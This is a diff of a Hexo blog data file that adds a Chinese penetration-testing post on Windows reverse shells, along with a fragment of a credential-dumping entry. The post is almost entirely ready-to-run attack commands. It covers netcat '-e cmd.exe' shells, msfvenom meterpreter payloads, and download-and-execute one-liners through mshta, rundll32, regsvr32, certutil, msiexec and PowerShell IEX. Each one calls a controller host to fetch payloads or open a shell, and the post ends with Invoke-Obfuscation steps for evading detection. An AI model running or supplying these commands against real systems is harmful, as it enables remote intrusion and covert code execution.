-<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
-<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>
-
-<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
-<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows密码凭证获取</title>
     <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
@@ -655,6 +613,125 @@
 <li><a href="http://www.somd5.com/">www.somd5.com</a></li>
 </ul>
 <h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Window反弹Shell</title>
+    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
+    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
+<blockquote>
+<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
+<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
+<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/4.png"></p>
+<h4 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h4><p>mshta.exe是用于负责解释运行HTA(HTML应用程序)文件的Windows系统应用程序。可以运行JavaScript或 VBScript的HTML文件。</p>
+<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> lport <span class="number">7777</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target <span class="number">1</span></span><br><span class="line">msf6 exploit(windows/misc/hta_server) &gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/jmTzAZDOdeGOUV.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/5.png"></p>
+<blockquote>
+<p>Tips:</p>
+<p>在VPS上使用hta_server模块设置lhost时可能会出现无法接收到shelll的问题，是因为VPS主机内部全部采用私有IP地址（如192.68.0.X)，通过一个公共的IP地址与外界进行通信。</p>
+<p>需要设置reverselistenerbindaddress 选项，绑定到本地系统上的特定IP地址</p>
+</blockquote>
+<h6 id><a href="#" class="headerlink" title></a></h6><h6 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> <span class="literal">-o</span> <span class="number">1</span>.hta</span><br><span class="line">python –m SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">mshta.exe http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure>
+
+<h6 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h6><ol>
+<li>生成hta</li>
+</ol>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/6.png"></p>
+<ol start="2">
+<li><p>生成恶意站点</p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/7.png"></p>
+</li>
+</ol>
+<h4 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h4><p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存 库中。 动态链接库英文为DLL (Dynamic Link Library) 。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</p>
+<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
+<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
+<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+<blockquote>
+<p>语法:</p>
+<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
+<p>/u - 注销服务器 </p>
+<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
+<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
+<p>/s - 沉默; 不显示消息框</p>
+</blockquote>
+<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
+<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
+<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
+<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
+<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
+<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
+<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>
+
+<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
+<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
